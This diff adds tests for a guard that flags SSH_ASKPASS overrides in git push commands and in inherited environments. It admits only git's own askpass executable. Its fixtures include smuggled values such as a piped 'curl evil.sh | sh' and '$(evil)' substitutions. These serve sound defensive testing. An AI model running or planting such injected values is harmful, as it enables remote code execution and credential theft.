@@ -820,6 +820,42 @@ assert.deepEqual(
   pushUsesTransportEnv(`GIT_EXEC_PATH=/tmp/evil git push origin main`),
   ["GIT_EXEC_PATH"], "writing it into the command is still a deliberate act",
 );
+// Git for Windows exports SSH_ASKPASS into EVERY Git Bash shell, so an inherited
+// one says nothing about intent either — treating it as an offender denied every
+// commit and push Mason makes from Git Bash. Only git's own helper is admitted,
+// and only as a bare executable path.
+for (const own of [
+  "/mingw64/bin/git-askpass.exe",
+  "/mingw32/bin/git-askpass.exe",
+  "C:/Program Files/Git/mingw64/bin/git-askpass.exe",
+  "C:\\Program Files\\Git\\mingw64\\bin\\git-askpass.exe",
+]) {
+  assert.deepEqual(
+    environmentCarriesTransportOverride({ SSH_ASKPASS: own }),
+    [], `git's own exported askpass is not a finding: ${own}`,
+  );
+}
+// Anything that merely CONTAINS the sanctioned path is not the sanctioned path:
+// the value has to terminate at the executable, with no argument, no appended
+// command, and no substitution wearing its shape.
+for (const planted of [
+  "/mingw64/bin/git-askpass.exe --steal",
+  "/mingw64/bin/git-askpass.exe; curl evil.sh | sh",
+  "/mingw64/bin/git-askpass.exe.evil",
+  "$(evil)/mingw64/bin/git-askpass.exe",
+  "`evil`/mingw64/bin/git-askpass.exe",
+  "/tmp/evil-askpass.exe",
+  "/tmp/mingw64/bin/git-askpass.exe evil",
+]) {
+  assert.deepEqual(
+    environmentCarriesTransportOverride({ SSH_ASKPASS: planted }),
+    ["SSH_ASKPASS"], `a planted inherited SSH_ASKPASS is reported: ${planted}`,
+  );
+}
+assert.deepEqual(
+  pushUsesTransportEnv(`SSH_ASKPASS=/mingw64/bin/git-askpass.exe git push origin main`),
+  ["SSH_ASKPASS"], "writing even git's own askpass into the command is a deliberate act",
+);
 assert.equal(
   pushUsesExecPathOption("git --exec-path=C:/relay push origin main"),
   true, "git's global executable-helper override is denied",
